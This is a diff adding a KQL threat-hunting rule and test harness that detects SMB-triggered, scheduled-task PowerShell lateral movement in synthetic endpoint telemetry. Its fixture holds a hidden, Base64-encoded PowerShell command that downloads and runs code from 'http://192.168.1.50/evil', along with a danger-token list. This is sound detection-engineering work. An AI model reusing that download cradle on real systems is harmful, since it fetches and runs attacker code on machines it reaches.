@@ -1,0 +1,109 @@
+// ============================================================================
+// STEP 1: THE DATA (HARDCODED TIMESTAMPS)
+// ============================================================================
+let MordorRaw = datatable(RawData: dynamic)
+[
+    // 1. Network: Inbound SMB at 10:00:00
+    dynamic({ 
+        "event_id": 3, 
+        "fixed_time": "2025-01-01T10:00:00Z", // <--- HARDCODED
+        "computer_name": "TARGET-DB-SQL", 
+        "destination_port": 445, 
+        "source_ip": "172.16.0.55", 
+        "user": "Attacker" 
+    }),
+    
+    // 2. Process: Svchost spawning PowerShell at 10:00:05 (5 seconds later)
+    // This creates a PERFECT 5-second delta for the join.
+    dynamic({ 
+        "event_id": 1, 
+        "fixed_time": "2025-01-01T10:00:05Z", // <--- HARDCODED
+        "computer_name": "TARGET-DB-SQL", 
+        "file_name": "powershell.exe", 
+        "command_line": "powershell.exe -NoP -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABHAGEAZQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANQA4AC4AMQAuADUAMAAvAGUAdgBpAGwAJwApAA==", 
+        "parent_name": "svchost.exe", 
+        "user": "SYSTEM" 
+    }),
+
+    // 3. Safety Padding
+    dynamic({ "event_id": 11, "fixed_time": "2025-01-01T10:00:00Z", "computer_name": "DUMMY", "target_filename": "safe.txt", "image_path": "System" })
+];
+
+// ============================================================================
+// STEP 2: HARNESS (Simple Parsing)
+// ============================================================================
+let DeviceProcessEvents = 
+    MordorRaw | where toint(RawData.event_id) == 1 
+    | extend Timestamp = todatetime(RawData.fixed_time), DeviceId = tostring(RawData.computer_name), DeviceName = tostring(RawData.computer_name), FileName = tostring(RawData.file_name), ProcessCommandLine = tostring(RawData.command_line), InitiatingProcessFileName = tostring(RawData.parent_name), InitiatingProcessCommandLine = "svchost.exe -k netsvcs -p -s Schedule", AccountName = tostring(RawData.user), SHA256 = "DUMMYHASH" 
+    | project Timestamp, DeviceId, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName, SHA256;
+
+let DeviceNetworkEvents = 
+    MordorRaw | where toint(RawData.event_id) == 3 
+    | extend Timestamp = todatetime(RawData.fixed_time), DeviceId = tostring(RawData.computer_name), DeviceName = tostring(RawData.computer_name), RemoteIP = tostring(RawData.source_ip), LocalPort = toint(RawData.destination_port), ActionType = "InboundConnectionAccepted" 
+    | project Timestamp, DeviceId, DeviceName, RemoteIP, LocalPort, ActionType;
+
+let DeviceFileEvents = 
+    MordorRaw | where toint(RawData.event_id) == 11 
+    | extend Timestamp = todatetime(RawData.fixed_time), DeviceId = tostring(RawData.computer_name), FileName = tostring(split(RawData.target_filename, "\\")[-1]), FolderPath = tostring(RawData.target_filename), SHA256 = "DUMMYHASH" 
+    | project Timestamp, DeviceId, FileName, FolderPath, SHA256;
+
+let DeviceRegistryEvents = datatable(Timestamp:datetime, DeviceId:string, ActionType:string, RegistryKey:string, RegistryValueName:string, RegistryValueData:string)[datetime(2025-01-01), "DUMMY", "RegistryValueSet", "HKLM\\Software\\Dummy", "Value", "Data"];
+
+// ============================================================================
+// STEP 3: THE RULE (Validating the Logic)
+// ============================================================================
+
+// Lookback set to 10 YEARS to ensure our 2025 hardcoded date is found
+let Lookback      = 3650d; 
+let CorrWindow    = 20m;   
+
+// Simple Regex for testing
+let Base64ChunkedRx   = @"[A-Za-z0-9+/]{50,}"; 
+let DangerTokens = dynamic(["-enc","-encodedcommand","hidden","http:"]);
+let ScheduleParent = "svchost.exe";
+
+let InboundSMBRPC = DeviceNetworkEvents | where ActionType == "InboundConnectionAccepted" | where LocalPort in (445, 135) | project DeviceId, SMBTime=Timestamp, SourceIP=RemoteIP, LocalPort;
+let TaskCacheArtifacts = DeviceRegistryEvents | where ActionType == "RegistryValueSet" | project DeviceId, TaskArtTime=Timestamp, TaskRK=RegistryKey;
+let TaskArtifactDrops = DeviceFileEvents | project DeviceId, DropTime=Timestamp, DropFile=FileName;
+let OrgPrevalence = DeviceFileEvents | summarize ChildDeviceCount = dcount(DeviceId) by SHA256;
+
+// Baseline Truth
+let ScheduleExec =
+    DeviceProcessEvents
+    | where InitiatingProcessFileName =~ ScheduleParent
+    | extend ChildCmdL = tolower(tostring(ProcessCommandLine)) 
+    | extend
+        ChildTime = Timestamp,
+        ChildProc = tostring(FileName),
+        ChildCmd  = tostring(ProcessCommandLine),
+        HasDanger = toint(ChildCmdL has_any (DangerTokens)),
+        HasBase64 = toint(ChildCmdL matches regex Base64ChunkedRx) 
+    | project DeviceId, DeviceName, ChildTime, AccountName, ChildProc, ChildCmd, HasDanger, HasBase64, ChildSHA = SHA256;
+
+// Correlation
+ScheduleExec
+| join kind=inner (InboundSMBRPC) on DeviceId
+| where SMBTime between ((ChildTime - CorrWindow) .. ChildTime)
+| join kind=leftouter (TaskCacheArtifacts) on DeviceId
+| join kind=leftouter (TaskArtifactDrops) on DeviceId
+| join kind=leftouter (OrgPrevalence) on $left.ChildSHA == $right.SHA256
+| summarize
+    Time = min(ChildTime),
+    TargetHost = any(DeviceName),
+    SourceIPs = make_set(SourceIP, 15),
+    ExecChildren = make_set(ChildProc, 10),
+    ExecCmds = make_set(ChildCmd, 10),
+    AnyDanger = toint(max(HasDanger) == 1),
+    AnyBase64 = toint(max(HasBase64) == 1)
+  by DeviceId
+
+// SCORING
+| extend
+    BaseScore = 60,
+    Score_Danger = 20 * AnyDanger,
+    Score_Base64 = 15 * AnyBase64,
+    Score_MultiSource = 5 * toint(array_length(SourceIPs) >= 2)
+| extend RiskScore = BaseScore + Score_Danger + Score_Base64 + Score_MultiSource
+| extend Severity = case(RiskScore >= 85, "HIGH", "MEDIUM")
+| extend HunterDirective = strcat("ACTION: ", Severity, " Empire/SchTask Lateral Movement Detected | Host=", TargetHost)
+| project Time, Severity, RiskScore, TargetHost, ExecChildren, ExecCmds, HunterDirective
